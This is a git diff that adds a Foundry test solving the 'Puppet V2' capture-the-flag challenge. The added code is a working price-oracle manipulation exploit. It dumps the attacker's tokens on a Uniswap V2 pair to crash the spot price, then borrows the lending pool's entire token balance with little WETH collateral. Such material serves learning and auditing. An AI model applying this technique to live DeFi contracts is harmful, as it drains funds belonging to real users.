@@ -103,6 +103,43 @@ contract PuppetV2 is Test {
         /**
          * EXPLOIT START *
          */
+        // check WETH deposit required
+        uint256 initDepositRequired = puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("initDepositRequired:", initDepositRequired); // 300_000 ether
+
+        vm.startPrank(attacker);
+
+        // path for swapExactTokensForETH
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+
+        // approve transfer of DVT for spender uniswapV2Router
+        dvt.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        uint256[] memory amounts = uniswapV2Router.swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE, 1, path, attacker, block.timestamp + 60
+        );
+
+        // attacker balance after uniswapV2 swap
+        console.log("- Attacker ETH:", attacker.balance); // 29900695134061569016 wei
+        console.log("- Attacker DVT:", dvt.balanceOf(attacker)); // 0
+
+        weth.deposit{value: attacker.balance}();
+        console.log("- Attacker WETH:", weth.balanceOf(attacker)); // 29900695134061569016 wei
+
+        // check WETH deposit required
+        uint256 depositRequired = puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("depositRequired:", depositRequired); // 29496494833197321980 wei
+
+        weth.approve(address(puppetV2Pool), weth.balanceOf(attacker));
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        vm.stopPrank();
+
+        console.log("- Attacker ETH:", attacker.balance);
+        console.log("- Attacker WETH:", weth.balanceOf(attacker));
+        console.log("- Attacker DVT:", dvt.balanceOf(attacker));
 
         /**
          * EXPLOIT END *
